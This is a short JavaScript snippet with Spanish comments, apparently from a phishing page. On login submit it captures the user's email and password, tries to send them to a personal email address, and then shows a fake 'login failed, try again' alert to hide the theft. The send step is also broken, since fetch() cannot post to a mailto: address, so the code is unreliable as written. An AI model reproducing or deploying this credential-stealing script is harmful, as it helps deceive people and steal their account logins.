
document.querySelector('#loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const email = document.querySelector('input[type="email"]').value;
    const password = document.querySelector('input[type="password"]').value;

    // Enviar los datos al correo electrónico
    fetch('mailto:raibernavarro24@gmail.com', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, password })
    })
    .then(() => {
        alert('Error al iniciar sesion por favor intenta de nuevo.');
    })
    .catch(error => {
        console.error('Error al enviar la información:', error);
        alert('Error al enviar la información. Inténtalo de nuevo.');
    });
});
